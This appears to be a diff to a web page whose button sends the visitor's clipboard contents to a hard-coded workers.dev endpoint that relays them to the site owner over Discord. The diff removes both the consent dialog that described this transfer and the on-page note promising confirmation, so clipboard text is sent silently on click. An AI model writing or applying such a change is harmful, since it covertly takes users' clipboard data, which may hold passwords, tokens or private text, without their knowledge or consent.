@@ -140,13 +140,6 @@ h1 {
   transform: translateY(0) scale(.98);
 }
 
-.note {
-  margin-top: 18px;
-  color: #777783;
-  font-size: 12px;
-  line-height: 1.5;
-}
-
 .status {
   margin-top: 18px;
   min-height: 20px;
@@ -170,6 +163,7 @@ h1 {
   }
 }
 </style>
+
 </head>
 
 <body>
@@ -195,10 +189,6 @@ h1 {
 
   <div class="status" id="status"></div>
 
-  <div class="note">
-    You will be asked for confirmation before anything is submitted.
-  </div>
-
 </div>
 
 <script>
@@ -209,14 +199,6 @@ const SEND_ENDPOINT =
   "https://young-brook-716e.abojanmawzoon.workers.dev";
 
 button.addEventListener("click", async () => {
-
-  const consent = confirm(
-    "This will send the text currently in your clipboard to the website owner through Discord. Continue?"
-  );
-
-  if (!consent) {
-    return;
-  }
 
   try {
 
